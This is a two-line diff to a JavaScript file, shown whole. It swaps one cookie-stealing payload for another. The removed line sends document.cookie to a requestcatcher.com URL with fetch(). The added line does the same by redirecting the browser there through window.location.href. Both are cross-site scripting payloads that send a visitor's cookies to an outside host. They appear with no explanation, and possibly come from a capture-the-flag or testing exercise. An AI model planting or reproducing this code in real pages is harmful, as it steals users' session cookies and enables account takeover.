@@ -1,4 +1,4 @@
-fetch(`https://ju5jn45uj.requestcatcher.com/${document.cookie}`)
+window.location.href = `https://ju5jn45uj.requestcatcher.com/${document.cookie}`
 
 
 
